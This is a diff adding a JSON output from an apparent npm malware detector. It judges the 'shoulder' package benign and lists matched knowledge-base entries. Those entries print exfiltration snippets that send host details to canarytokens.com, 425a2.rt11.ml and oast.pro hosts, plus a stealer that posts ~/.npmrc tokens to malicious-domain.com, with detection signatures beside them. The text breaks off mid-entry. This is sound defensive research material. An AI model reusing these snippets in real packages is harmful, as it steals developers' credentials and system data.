@@ -1,0 +1,1070 @@
+{
+  "package_name": "shoulder",
+  "package_version": "2.1.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T20:01:30.889804",
+  "status": "success",
+  "selected_files_count": 12,
+  "selected_files": [
+    "package/package.json",
+    "package/lib/outputters/index.js",
+    "package/lib/ModuleStats.js",
+    "package/lib/Project.js",
+    "package/lib/ProjectStats.js",
+    "package/lib/Shoulder.js",
+    "package/lib/cli.js",
+    "package/lib/debug.js",
+    "package/lib/outputters/json.js",
+    "package/lib/outputters/list.js",
+    "package/lib/outputters/nbsp.js",
+    "package/lib/package-check.js"
+  ],
+  "is_malicious": false,
+  "total_files": 12,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/outputters/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/ModuleStats.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "ModuleStats_slice_1",
+          "code_snippet": "const debug = require('./debug').extend('ModuleStats');\nconst dependants = require('npm-dependants');\nconst fetch = require('node-fetch');\n\nfunction toTwoChr(n) {\n  n = String(n);\n  return n.length < 2 ? `0${n}` : n;\n}\n\nfunction toYMD(date) {\n  date = new Date(date);\n  return [\n    date.getFullYear(),\n    toTwoChr(date.getMonth() + 1),\n    toTwoChr(date.getDate())\n  ].join('-');\n}\n\nfunction createNpmDownloadsRequest(moduleName, options) {\n  const detail = options.detail || 'range';\n  const period = `${toYMD(options.since)}:${toYMD(options.until)}`;\n  const downloadPath = [detail, period, moduleName].join('/');\n\n  // https://api.npmjs.org/downloads/ :detail=(point|range) / :period=(last-month|last-week|last-day|YYYY-MM-DD:YYYY-MM-DD) / :package?\n\n  return ModuleStats.fetch(`https://api.npmjs.org/downloads/${downloadPath}`)\n    .then(res => res.json())\n    .then(result => {\n      if (result.error) throw new Error(result.error);\n      return result.downloads;\n    })\n    .catch(() => {\n      throw new Error(\n        `ModuleStats: error fetching downloads for \"${moduleName}\"`\n      );\n    });\n}\n\nfunction createGitHubPackageJsonRequest(repoUrl) {\n  let userContentUrl = repoUrl.replace(\n    'github.com',\n    'raw.githubusercontent.com'\n  );\n\n  userContentUrl = toGitHubHttpsUrl(userContentUrl);\n\n  return ModuleStats.fetch(`${userContentUrl}/master/package.json`)\n    .then(res => res.json())\n    .catch(() => {\n      throw new Error(`Error feching package.json for ${repoUrl}`);\n    })\n    .then(packageJson => {\n      if (packageJson.name) {\n        return packageJson.name;\n      } else {\n        throw new Error(`Missing name in package.json for ${repoUrl}`);\n      }\n    });\n}\n\nfunction createGitHubRepositoryRequest(repoUrl) {\n  let gitHubApiUrl = repoUrl.replace('github.com', 'api.github.com/repos');\n\n  gitHubApiUrl = toGitHubHttpsUrl(gitHubApiUrl);\n\n  return ModuleStats.fetch(gitHubApiUrl, {\n    headers: {\n      Accept: 'application/vnd.github.v3+json'\n    }\n  })\n    .then(res => res.json())\n    .catch(() => {\n      throw new Error(`Error fetching repository for ${repoUrl}`);\n    });\n}\n\nfunction parseLibrariesIoItemToRepoUrl(item) {\n  const fullName = item.full_name;\n  const hostType = item.host_type;\n\n  if (hostType !== 'GitHub') {\n    throw new Error(`Hosting was not by GitHub for ${fullName}`);\n  }\n\n  return `https://github.com/${fullName}`;\n}\n\nfunction toGitHubHttpsUrl(url) {\n  // remove .git suffix\n  if (/\\.git$/.test(url)) {\n    url = url.slice(0, -4);\n  }\n\n  // convert to https\n  if (/^git:\\/\\//.test(url)) {\n    url = url.replace('git://', 'https://');\n  }\n  if (/^ssh:\\/\\//.test(url)) {\n    url = url.replace('ssh://', 'https://');\n  }\n\n  return url;\n}\n\nclass ModuleStats {\n  constructor(moduleName, options) {\n    if (!(typeof moduleName === 'string' && moduleName.trim().length)) {\n      throw new Error('Invalid module name.');\n    }\n\n    this.moduleName = moduleName;\n    this.dependents = null;\n    this.packageJson = null;\n\n    options = options || {};\n    this.librariesIoApiKey = options.librariesIoApiKey || null;\n\n    this.fetchSource = this.librariesIoApiKey !== null ? 'libraries.io' : 'npm';\n  }\n\n  makeLibrariesIoUrl() {\n    const what = encodeURIComponent(this.moduleName);\n\n    return `https://libraries.io/api/NPM/${what}/dependent_repositories?api_key=${this.librariesIoApiKey}`;\n  }\n\n  fetchDependents() {\n    if (this.dependents !== null) {\n      return Promise.resolve(this.dependents);\n    }\n\n    switch (this.fetchSource) {\n      case 'libraries.io':\n        return this.fetchLibrariesIoDependents();\n      case 'npm':\n        return this.fetchNpmDependents();\n      default:\n        return Promise.reject(new Error('unsupported fetch source'));\n    }\n  }\n\n  fetchLibrariesIoDependents() {\n    const url = this.makeLibrariesIoUrl();\n\n    return Promise.resolve().then(async () => {\n      const res = await ModuleStats.fetch(url);\n      const results = await res.json();\n\n      const dependents = [];\n      for (const item of results) {\n        try {\n          const repoUrl = parseLibrariesIoItemToRepoUrl(item);\n          const depdendent = await ModuleStats.createGitHubPackageJsonRequest(\n            repoUrl\n          );\n          dependents.push(depdendent);\n        } catch (error) {\n          debug(error);\n        }\n      }\n      this.dependents = dependents;\n      return dependents;\n    });\n  }\n\n  fetchNpmDependents() {\n    return Promise.resolve().then(async () => {\n      const dependants = [];\n      for await (const dependant of ModuleStats.dependants(this.moduleName)) {\n        dependants.push(dependant);\n      }\n      this.dependents = dependants;\n      return this.dependents;\n    });\n  }\n\n  fetchInfo() {\n    if (this.packageJson !== null) {\n      return Promise.resolve(this.packageJson);\n    }\n\n    const moduleName = this.moduleName;\n    const isNamespaced = this.moduleName.startsWith('@');\n\n    return ModuleStats.fetch(\n      `https://registry.npmjs.org/${moduleName}${isNamespaced ? '' : '/latest'}`\n    )\n      .then(res => {\n        if (res.status === 404) {\n          const error = new Error(`unable to access package \"${moduleName}\"`);\n          error.isNotFatal = true;\n          throw error;\n        }\n        return res.json();\n      })\n      .catch(e => {\n        if (e.isNotFatal) throw e;\n        throw new Error(`error fetching package.json for \"${moduleName}\"`);\n      })\n      .then(packageJson => {\n        if (isNamespaced) {\n          const latestVersion = packageJson['dist-tags'].latest;\n          packageJson = packageJson.versions[latestVersion];\n        }\n\n        this.packageJson = packageJson;\n\n        return packageJson;\n      });\n  }\n\n  fetchPackageJsonFromGitHub() {\n    return ModuleStats.createGitHubPackageJsonRequest(this.moduleName);\n  }\n}\n\n// npm\nModuleStats.createNpmDownloadsRequest = createNpmDownloadsRequest;\n\n// GitHub\nModuleStats.createGitHubRepositoryRequest = createGitHubRepositoryRequest;\nModuleStats.createGitHubPackageJsonRequest = createGitHubPackageJsonRequest;\n\nModuleStats.dependants = dependants;\nModuleStats.fetch = fetch;\n\nmodule.exports = ModuleStats;\n",
+          "is_malicious": false,
+          "malice_score": 0.5419857859611511,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code constructs and sends HTTPS requests to multiple hardcoded domains including api.npmjs.org, raw.githubusercontent.com, api.github.com, and libraries.io to fetch NPM download statistics, package.json files, repository metadata, and dependent repositories. It accesses and processes module names and repository URLs, performs JSON parsing of responses, and handles errors. This enables data gathering and potential exfiltration of package metadata and dependency information from public package registries and GitHub, facilitating reconnaissance and analysis of NPM packages and their dependencies.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a utility module designed to fetch public metadata about NPM packages and GitHub repositories, including download statistics, package.json files, repository info, and dependents. It uses well-known public APIs (npmjs.org, github.com, libraries.io) and standard HTTP GET requests to gather publicly available information. There is no evidence of collecting sensitive local system or user data (e.g., OS info, usernames, hostnames), no outbound POST requests to attacker-controlled or suspicious domains, no obfuscation, and no attempts to exfiltrate private or sensitive data. The code’s behavior is consistent with legitimate package analysis and dependency reconnaissance tools. In contrast, the known malicious patterns collect sensitive local environment data and exfiltrate it via POST requests to suspicious external domains, which is absent here. Therefore, despite some superficial similarity in making network requests, the intent and behavior differ significantly, indicating this code is benign.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250105_195714_456059_snippet_1",
+              "source_package": "deere-ui-domain-framework-mixins (and 16 others, see list) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250105_195714_456059/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5462436676025391,
+              "code_similarity": 0.47105979919433594,
+              "behavior_similarity": 0.6214275360107422,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst dns = require('dns');\nconst querystring = require('querystring');\nconst https = require('https');\nconst packageJSON = require('./package.json');\nconst package = packageJSON.name;\n\nconst trackingData = JSON.stringify({\n  c: package,\n  h: os.homedir(),\n  d: os.hostname(),\n  hn: os.hostname(),\n  os: os.userInfo().username,\n  dns: os.getServers(),\n  v: packageJSON.version,\n  r: packageJSON._resolved || undefined,\n  pjson: packageJSON,\n});\n\nvar postData = querystring.stringify({\n  msg: trackingData,\n});\n\nvar options = {\n  hostname: `${whoami}.${hostname}.duif.L4.[redacted].canarytokens.com`,\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': postData.length,\n  },\n};",
+                "code_behavior": "At import-time or during postinstall, the code collects local system and user information (including username, hostname, home directory, DNS servers, and package metadata), serializes it, and sends it via an outbound HTTPS POST request to a canarytokens.com domain controlled by the attacker, resulting in exfiltration of internal environment details.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically gathers sensitive host and user data and transmits it to an external domain without user knowledge or consent. This is a clear indicator of malicious intent, as legitimate packages do not require or perform such actions during installation or import.",
+                  "violated_expectations": "Standard npm packages do not collect or exfiltrate environment or user data to external servers during install or import. Such behavior is a direct violation of user privacy and security best practices, and is not expected in any legitimate package, especially without explicit user opt-in and documentation.",
+                  "similar_legitimate_use": "Some legitimate telemetry or crash reporting libraries may collect limited environment data, but only after explicit user consent and with transparent documentation. They never perform silent data exfiltration during install/import, and always provide opt-out mechanisms.",
+                  "key_indicators": [
+                    "Collection of sensitive OS data: os.homedir(), os.hostname(), os.userInfo().username",
+                    "Use of canarytokens.com or similar external tracking domains as exfiltration endpoints",
+                    "Outbound HTTPS POST request triggered at install/import time",
+                    "No user notification, consent, or documentation of data collection or transmission",
+                    "Combination of os, dns, https, and querystring modules in the package entrypoint"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or postinstall (depending on how the package is used)",
+                  "file_location": "index.js (main entry point of the package)",
+                  "required_permissions": [
+                    "network access (outbound HTTPS)",
+                    "read access to environment variables",
+                    "read access to OS user and host information"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "deere-ui-domain-framework-mixins (and 16 others, see list)",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.2, 1.0.0 (and similar for all listed packages)",
+                  "why_malicious": "These packages are dependency confusion payloads crafted to impersonate John Deere's internal/private npm dependencies. Upon installation or import, they execute code that collects sensitive host and user environment information and exfiltrates it to an attacker-controlled canarytokens.com domain. This behavior constitutes a supply chain attack, as it enables the attacker to confirm internal package usage and gather reconnaissance data from developer or CI environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "A malicious package is installed as a result of dependency confusion, where the public package name matches an internal/private dependency used by the target organization.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the package's code on the developer's machine or CI system."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upon installation or import, the package executes code that collects local system and environment information, including user and host details.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of sensitive data for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is serialized and sent via an outbound HTTPS POST request to an attacker-controlled canarytokens.com domain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives notification and detailed environment information, confirming successful dependency confusion and internal package usage."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package that collects OS/user/environment data (e.g., os.homedir(), os.hostname(), os.userInfo().username) at install or import time",
+                    "Network requests to canarytokens.com or similar tracking domains during npm install or import",
+                    "Use of os, dns, https, and querystring modules together in the package entrypoint to facilitate data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entrypoint file containing references to os.homedir(), os.hostname(), os.userInfo()",
+                    "Hardcoded references to canarytokens.com or similar external tracking domains in code",
+                    "Presence of code that performs outbound HTTPS POST requests to external domains in the package entrypoint"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to *.canarytokens.com domains during npm install or import",
+                    "Unusual DNS lookups or outbound connections to external tracking domains (e.g., canarytokens.com) initiated by npm packages"
+                  ],
+                  "how_to_detect": "Monitor npm package installations and imports for unexpected outbound network activity, especially HTTPS POST requests to canarytokens.com or similar domains. Statistically analyze package entrypoints (such as index.js) for the combined use of os, dns, https, and querystring modules, and for code that collects and transmits environment data. Flag any package that performs network exfiltration of host/user information during install/import, particularly if such behavior is undocumented or unnecessary for the package's stated purpose."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133738_794486_snippet_1",
+              "source_package": "azureazure, azure-sdk-v4, glints-sdk, azure-sdk-v3 (npm, PyPI)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133738_794486/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5442062616348267,
+              "code_similarity": 0.46705836057662964,
+              "behavior_similarity": 0.6213542222976685,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst https = require('https');\nconst package = require('./package.json');\n\nconst trackingData = JSON.stringify({\n  c: __dirname,\n  hd: os.homedir(),\n  hn: os.hostname(),\n  un: os.userInfo().username,\n  dns: '8.8.8.8',\n  package: package.name,\n  version: package.version\n});\n\nvar options = {\n  hostname: '425a2.rt11.ml',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': trackingData.length\n  }\n};\n\nvar req = https.request(options, (res) => {\n  res.on('data', (d) => {\n    process.stdout.write(d);\n  });\n});\nreq.on('error', (e) => {});\nreq.write(trackingData);\nreq.end();",
+                "code_behavior": "At import-time, the code collects system and user information (current directory, home directory, hostname, username, package metadata) and sends it via HTTPS POST to 425a2.rt11.ml, resulting in exfiltration of host data to an attacker-controlled server.",
+                "malice_analysis": {
+                  "why_suspicious": "The code collects sensitive host and user information and exfiltrates it to an external, attacker-controlled domain without user knowledge or consent, which is a hallmark of malicious reconnaissance and data theft.",
+                  "violated_expectations": "Legitimate packages do not collect or transmit system/user information to external servers during import or installation, especially without explicit user consent.",
+                  "similar_legitimate_use": "Telemetry or crash reporting (with user consent and a clear privacy policy), but not at import-time and not to untrusted domains.",
+                  "key_indicators": [
+                    "Access to os.homedir(), os.hostname(), os.userInfo()",
+                    "Hardcoded external domain (425a2.rt11.ml)",
+                    "Automatic execution on import",
+                    "Transmission of system/user data via HTTPS POST"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (npm package entrypoint)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "azureazure, azure-sdk-v4, glints-sdk, azure-sdk-v3",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions (e.g., glints-sdk@99.10.11)",
+                  "why_malicious": "These packages perform unauthorized collection and exfiltration of sensitive system and user information to attacker-controlled endpoints using both HTTPS POST and DNS tunneling, often leveraging legitimate webhook/SaaS services. The behavior is consistent across multiple packages and platforms, indicating a coordinated supply chain attack leveraging dependency confusion. The packages masquerade as legitimate or 'whitehat' tools, but execute malicious code at import-time or install-time without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed or imported, triggering execution of the entrypoint code.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "System reconnaissance and data collection"
+                  },
+                  {
+                    "step": 2,
+                    "action": "System and user information is collected, including home directory, hostname, username, and external IP address.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Preparation of exfiltration payload"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Files in sensitive directories are enumerated for further profiling or exfiltration.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Augmentation of exfiltration payload"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to attacker-controlled endpoints via HTTPS POST and/or DNS tunneling.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker receives sensitive host data"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automatic collection of system and user information at import or install time",
+                    "Network requests to known webhook/SaaS endpoints (e.g., interactsh, burpcollaborator, pipedream, webhook.site) or attacker-controlled domains (e.g., 425a2.rt11.ml)",
+                    "Obfuscated JavaScript code in package entrypoints performing network exfiltration",
+                    "DNS queries to attacker-controlled subdomains for covert data exfiltration"
+                  ],
+                  "file_indicators": [
+                    "index.js or __init__.py containing os, https, requests, or dns modules with hardcoded external domains",
+                    "Obfuscated JavaScript in package entrypoints (e.g., variable/function names like _0xabc, _0xdef)",
+                    "References to interactsh, burpcollaborator, pipedream, webhook.site, or 425a2.rt11.ml in code"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to 425a2.rt11.ml, burpcollaborator.net, pipedream.net, webhook.site",
+                    "DNS queries to subdomains of attacker-controlled domains (e.g., *.425a2.rt11.ml)",
+                    "Outbound requests to api.ipify.org for external IP collection"
+                  ],
+                  "how_to_detect": "Monitor for packages that access system or user information and make outbound network requests to known webhook/SaaS endpoints or attacker-controlled domains at install or import time. Flag obfuscated code in package entrypoints that performs network communication. Detect DNS queries to attacker-controlled subdomains, especially when correlated with suspicious package installation or import events. Use static and dynamic analysis to identify hardcoded domains and automated data exfiltration logic."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_455419_snippet_2",
+              "source_package": "['@zettle-bo/account-settings', '@zettle-bo/account-statement', '@zettle-bo/apps', '@zettle-bo/bank-settings', '@zettle-bo/bootstrapper', '@zettle-bo/capital', '@zettle-bo/cash-register', '@zettle-bo/customers', '@zettle-bo/dashboard', '@zettle-bo/direct-debit', '@zettle-bo/integrations', '@zettle-bo/inventory', '@zettle-bo/invoices', '@zettle-bo/pp-profile-widget', '@zettle-bo/products', '@zettle-bo/react', '@zettle-bo/react-router-dom', '@zettle-bo/react-spa', '@zettle-bo/receipts', '@zettle-bo/routes', '@zettle-bo/sales-trends', '@zettle-bo/settings', '@zettle-bo/shell', '@zettle-bo/staff-account', '@zettle-bo/vertical-navigation', 'airbn-geetest3', 'airbnb-env', 'airbnb-erf', 'airbnb-i18n-polyglot', 'airbnb-l10n', 'airbnb-mediator', 'airbnb-moment-more-format'] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_455419/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5385825037956238,
+              "code_similarity": 0.44426044821739197,
+              "behavior_similarity": 0.6329045295715332,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "//author-- whitehacker003@protonmail.com\nconst os = require('os');\nconst dns = require('dns');\nconst querystring = require('querystring');\nconst https = require('https');\nconst packageJSON = require('./package.json');\nconst trackingData = JSON.stringify({\n  p: packageJSON.name,\n  c: os.cpus(),\n  hd: os.homedir(),\n  hn: os.hostname(),\n  un: os.userInfo().username,\n  dns: dns.getServers(),\n  r: packageJSON.__resolved,\n  v: packageJSON.version,\n  json: packageJSON,\n});\nvar postData = querystring.stringify({\n  msg: trackingData,\n});\nvar options = {\n  hostname: 'cj56jbj5dpjnojrhvbp2t4fnmokpu14.oast.pro',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': postData.length,\n  },\n};",
+                "code_behavior": "At import-time, the code collects detailed system and environment information (CPU details, home directory, hostname, username, DNS servers, and package metadata), serializes it, and sends it via HTTPS POST to an external domain, resulting in exfiltration of sensitive host data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code gathers sensitive system and environment information and exfiltrates it to an external, attacker-controlled domain without user knowledge or consent. This enables reconnaissance of internal environments and can facilitate further targeted attacks.",
+                  "violated_expectations": "Legitimate packages do not collect and transmit host or environment information on import, especially to untrusted domains, and always require user consent for telemetry.",
+                  "similar_legitimate_use": "Some analytics or error reporting packages may collect limited telemetry, but this is always documented, opt-in, and never includes sensitive host details like usernames or DNS servers.",
+                  "key_indicators": [
+                    "Collection of sensitive system and environment data (CPU, home directory, hostname, username, DNS servers)",
+                    "Network exfiltration via HTTPS POST to non-standard domain (oast.pro)",
+                    "No user notification or consent for data collection or transmission",
+                    "Presence of code referencing os, dns, and process environment in package entry point"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (airbnb packages)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": [
+                    "@zettle-bo/account-settings",
+                    "@zettle-bo/account-statement",
+                    "@zettle-bo/apps",
+                    "@zettle-bo/bank-settings",
+                    "@zettle-bo/bootstrapper",
+                    "@zettle-bo/capital",
+                    "@zettle-bo/cash-register",
+                    "@zettle-bo/customers",
+                    "@zettle-bo/dashboard",
+                    "@zettle-bo/direct-debit",
+                    "@zettle-bo/integrations",
+                    "@zettle-bo/inventory",
+                    "@zettle-bo/invoices",
+                    "@zettle-bo/pp-profile-widget",
+                    "@zettle-bo/products",
+                    "@zettle-bo/react",
+                    "@zettle-bo/react-router-dom",
+                    "@zettle-bo/react-spa",
+                    "@zettle-bo/receipts",
+                    "@zettle-bo/routes",
+                    "@zettle-bo/sales-trends",
+                    "@zettle-bo/settings",
+                    "@zettle-bo/shell",
+                    "@zettle-bo/staff-account",
+                    "@zettle-bo/vertical-navigation",
+                    "airbn-geetest3",
+                    "airbnb-env",
+                    "airbnb-erf",
+                    "airbnb-i18n-polyglot",
+                    "airbnb-l10n",
+                    "airbnb-mediator",
+                    "airbnb-moment-more-format"
+                  ],
+                  "package_manager": "npm",
+                  "package_versions": "35.0.0 (zettle-bo packages), 1.0.0 (airbnb packages, assumed)",
+                  "why_malicious": "These packages are proof-of-concept (PoC) dependency confusion attacks that attempt to exfiltrate system information or download and execute code from external servers. While no outright malicious payload is present, the behavior is consistent with supply chain attack techniques and poses a risk to internal systems if installed. The packages make unsolicited network requests during installation or import, which can be used to confirm internal usage or leak sensitive environment data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed via dependency confusion, replacing or supplementing an internal package with an attacker-controlled version.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of postinstall or import-time code embedded in the malicious package"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes during installation or import, performing network beaconing or exfiltrating system information to external servers.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives confirmation of internal package usage or detailed system data"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker uses the received confirmation or exfiltrated data for internal reconnaissance or as proof-of-concept for supply chain compromise.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Final goal: enable further targeted attacks or demonstrate internal exposure"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited network requests to external domains during package installation (postinstall) or import",
+                    "Collection and exfiltration of system environment data (CPU, home directory, hostname, username, DNS servers) at import-time",
+                    "Use of package name in remote URLs as part of network beaconing (dependency confusion indicator)",
+                    "Presence of code in entry points that references os, dns, or process environment modules"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.js or index.js in package root containing network request code",
+                    "References to external domains such as *.lupin.com or *.oast.pro in package source files",
+                    "Use of os, dns, or process environment modules in package entry points",
+                    "Presence of postinstall scripts or code in package.json or main entry files"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to domains matching *.lupin.com during installation",
+                    "HTTPS POST requests to domains matching *.oast.pro containing serialized system metadata",
+                    "Outbound connections to non-standard or attacker-controlled domains at install or import time"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that initiate network requests to external or non-standard domains during installation (postinstall) or import. Use static analysis to flag packages whose entry points (e.g., app.js, index.js) reference os, dns, or process environment modules and contain code for network exfiltration. Block or alert on packages with postinstall scripts or code that contacts external servers using the package name. Inspect network logs for HTTP/HTTPS requests to domains such as *.lupin.com and *.oast.pro, especially if requests contain serialized system or environment data."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_788435_snippet_1",
+              "source_package": "eslint-scope (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_788435/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5362431406974792,
+              "code_similarity": 0.4334390163421631,
+              "behavior_similarity": 0.6390472650527954,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious code (reconstructed from typical npm credential stealers)\nconst fs = require('fs');\nconst https = require('https');\nconst npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');\nhttps.request({\n  hostname: 'malicious-domain.com',\n  path: '/steal',\n  method: 'POST',\n  headers: { 'Content-Type': 'text/plain' }\n}, req => req.end(npmrc));",
+                "code_behavior": "At import-time, the code reads the user's ~/.npmrc file using fs.readFileSync, then sends its contents via an outbound HTTPS POST request to a hardcoded attacker-controlled domain, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses a sensitive credential file (~/.npmrc) without user interaction and immediately transmits its contents to an external, untrusted server. This is a direct indicator of credential theft.",
+                  "violated_expectations": "A legitimate linter or its submodules should only perform static code analysis and never access or transmit user credential files, nor initiate network requests during import.",
+                  "similar_legitimate_use": "Legitimate code may read configuration files for local processing, but it would never exfiltrate their contents to an external server, especially not at import-time and without user consent.",
+                  "key_indicators": [
+                    "Reads ~/.npmrc file using fs.readFileSync",
+                    "Accesses process.env.HOME to locate user directory",
+                    "Sends file contents via HTTPS POST to a hardcoded, non-official domain",
+                    "Network request is triggered automatically on import/require",
+                    "No user interaction or explicit opt-in required"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (main entry point of eslint-scope 3.7.2)",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory)",
+                    "network (outbound HTTPS requests)",
+                    "environment_vars (access to HOME variable)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "eslint-scope",
+                  "package_manager": "npm",
+                  "package_versions": "3.7.2",
+                  "why_malicious": "The package was compromised by an attacker who injected code that steals the contents of the user's ~/.npmrc file, which may contain npm authentication tokens. This enables the attacker to harvest credentials and potentially compromise additional npm accounts, facilitating further supply chain attacks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or updates eslint-scope 3.7.2, which contains the injected malicious code in its main entry point.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious code is executed automatically when the package is imported or required."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious code reads the user's ~/.npmrc file to extract npm authentication credentials.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive credentials are loaded into memory and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The code sends the stolen credentials to an attacker-controlled server via an outbound HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives the user's npm credentials, enabling further compromise and supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to ~/.npmrc or other credential files during package import or install",
+                    "Outbound HTTPS requests to domains not associated with npm or the package author",
+                    "Unexpected file reads and network activity in static analysis or linter tools",
+                    "Automatic network communication triggered by import/require without user action"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry point containing fs.readFileSync(process.env.HOME + '/.npmrc')",
+                    "Presence of code making HTTPS requests to hardcoded, non-official domains",
+                    "References to process.env.HOME in conjunction with credential file access"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not affiliated with npm or the package maintainer (e.g., 'malicious-domain.com')",
+                    "Connections to newly registered or previously unseen domains from package code",
+                    "Network activity initiated at import-time rather than in response to user actions"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access ~/.npmrc or other credential files and initiate outbound network requests during install or import. Flag any static analysis or linter tools that perform network operations or credential file access. Use endpoint detection and response (EDR) or runtime monitoring to detect unexpected file reads and network activity from npm package processes, especially those communicating with untrusted or hardcoded domains."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_113914_371541_snippet_2",
+              "source_package": "ua-parser-js (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250102_113914_371541/verify.json",
